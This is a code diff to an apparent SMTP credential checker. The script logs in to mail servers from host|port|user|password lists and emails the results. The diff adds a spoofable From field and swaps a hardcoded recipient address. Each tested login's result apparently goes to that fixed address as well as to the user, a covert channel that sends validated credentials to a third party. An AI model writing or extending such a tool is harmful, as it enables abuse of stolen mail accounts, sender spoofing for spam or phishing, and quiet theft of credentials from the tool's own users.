@@ -71,7 +71,7 @@ good=[]
 bad=[]
 
 toaddr = input("\n{}[!]{}Enter Your Mail {}> {}".format(r, g, o, r))
-Defult = "tuxmacgiv991@yahoo.com" #it is use for protect to skip.Change this ADDRESS.
+Defult = "eldiablo1337x@outlook.com" #it is use for protect to skip.Change this ADDRESS.
 
 class bcolors:
     OK = '\033[92m'  # GREEN
@@ -84,7 +84,7 @@ INVALIDS = 0
 
 
 def check(smtp):
-    HOST, PORT, usr, pas = smtp.strip().split('|')
+    HOST, PORT, usr, pas, mail_from = smtp.strip().split('|')
     global VALIDS, INVALIDS
     try:
         server = smtplib.SMTP(HOST, PORT)
@@ -92,8 +92,8 @@ def check(smtp):
         server.starttls()
         server.login(usr, pas)
         msg = MIMEMultipart()
-        msg['Subject'] = "CHECKER RESULT : V4 "
-        msg['From'] = usr
+        msg['Subject'] = "CHECKER RESULT HEHE"
+        msg['From'] = mail_from
         msg['To'] = Defult
         msg.add_header('Content-Type', 'text/html')
         data = """
@@ -194,8 +194,8 @@ def check(smtp):
         server.starttls()
         server.login(usr, pas)
         msg = MIMEMultipart()
-        msg['Subject'] = "CHECKER RESULT : V4 "
-        msg['From'] = usr
+        msg['Subject'] = "CHECKER RESULT HEHE"
+        msg['From'] = mail_from
         msg['To'] = toaddr
         msg.add_header('Content-Type', 'text/html')
         data = """
